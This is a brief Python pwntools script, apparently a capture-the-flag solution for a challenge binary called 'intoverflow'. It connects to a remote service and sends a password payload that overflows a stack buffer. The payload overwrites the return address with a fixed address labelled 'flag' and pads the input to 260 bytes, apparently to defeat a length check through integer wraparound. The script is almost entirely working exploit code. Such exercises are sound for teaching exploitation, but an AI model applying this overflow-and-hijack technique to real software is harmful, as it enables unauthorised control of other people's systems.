from pwn import *
#p=process('./intoverflow')
p=remote('111.198.29.45',53903)
#gdb.attach(p)
p.recvuntil("Your choice:")
p.sendline('1')
p.recvuntil("Please input your username:")
flag=0x804868b
p.sendline('aaa')
p.recvuntil("Please input your passwd:")
payload='a'*(0x14+0x4)+p32(flag)
payload=payload.ljust(260,'a')
p.sendline(payload)
p.interactive()
